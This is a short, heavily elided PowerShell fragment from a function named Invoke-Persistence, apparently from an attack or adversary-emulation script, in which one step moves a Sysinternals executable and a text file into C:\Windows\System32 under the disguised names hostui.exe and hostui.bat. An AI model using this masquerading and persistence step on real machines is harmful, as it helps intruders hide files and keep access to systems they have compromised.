...
function Invoke-Persistence {
    ...
    switch ($PersistStep) {
        ...
        2 
        {
            ...
            Move-Item "C:\Program Files\SysInternalsSuite\strings64.exe" "C:\Windows\System32\hostui.exe" -force;
            Move-Item "C:\Program Files\SysInternalsSuite\hostui.txt" "C:\Windows\System32\hostui.bat" -force;
